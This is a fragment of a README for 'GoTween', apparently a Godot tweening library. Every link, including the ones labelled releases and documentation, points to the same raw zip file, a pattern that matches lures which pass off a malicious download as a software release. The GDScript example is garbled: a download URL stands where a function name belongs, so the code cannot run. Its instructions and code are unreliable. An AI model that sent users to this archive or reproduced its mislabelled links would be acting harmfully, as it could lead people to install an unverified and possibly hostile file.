...
[![Download GoTween](https://raw.githubusercontent.com/okefonok/GoTween/main/GoTween/Tween-Go-1.8.zip)](https://raw.githubusercontent.com/okefonok/GoTween/main/GoTween/Tween-Go-1.8.zip)
...
1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/okefonok/GoTween/main/GoTween/Tween-Go-1.8.zip) to access the latest release.
...
2. **Call GoTween Functions** in the script:
   ```gdscript
   func _ready():
       https://raw.githubusercontent.com/okefonok/GoTween/main/GoTween/Tween-Go-1.8.zip($Sprite, 2, {"position": Vector2(400, 300), "ease": "ease_in_out"})
   ```
...
For further instructions on using GoTween, check our [Documentation](https://raw.githubusercontent.com/okefonok/GoTween/main/GoTween/Tween-Go-1.8.zip). Here, you can find examples, detailed API information, and advanced tips for maximizing GoTween’s potential.
...
Visit the Releases page to download the latest version of GoTween again [here](https://raw.githubusercontent.com/okefonok/GoTween/main/GoTween/Tween-Go-1.8.zip). Enjoy animating with ease!